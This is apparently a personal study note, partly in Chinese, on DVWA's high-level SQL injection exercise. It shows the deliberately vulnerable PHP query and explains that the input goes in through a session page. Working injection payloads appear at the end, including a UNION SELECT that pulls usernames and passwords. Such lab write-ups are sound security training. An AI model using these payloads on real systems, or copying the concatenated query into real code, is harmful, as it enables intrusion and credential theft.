# SQL Injection - High

## View Source

```PHP
<?php

if( isset( $_SESSION [ 'id' ] ) ) {
    // Get input
    $id = $_SESSION[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);        
}

?> 
```

- 透過 *Session* 裡面的 *id* 來查詢資料庫

### View `session-input.php`

1. `docker exec -it dvwa /bin/bash`
2. `vim /var/www/html/vulnerabilities/sqli/session-input.php`
- https://github.com/digininja/DVWA/blob/master/vulnerabilities/sqli/session-input.php
- 將 *POST* 收到的 *id* 放進 *Session* 中

## Code Review

- *SQL* 查詢語句多了 `LIMIT 1`、不會直接彈出錯誤訊息而是改成 `Something went wrong.`
> This is very similar to the low level, however this time the attacker is inputting the value in a different manner. The input values are being transferred to the vulnerable query via session variables using another page, rather than a direct GET request.
- 其實我不懂 *High Level* 的考點是什麼
- 是模擬開發者可能覺得 *session* 就很安全嗎？？？

## Answer

- 同 *Low Level*
- 要注入的 *SQL* 語句是要寫在超連結點開的新視窗
	- `127.0.0.1/vulnerabilities/sqli/session-input.php`

### Example

```
' OR '1'='1' #
' OR '1'='1' -- 
' UNION SELECT user, password FROM users #
```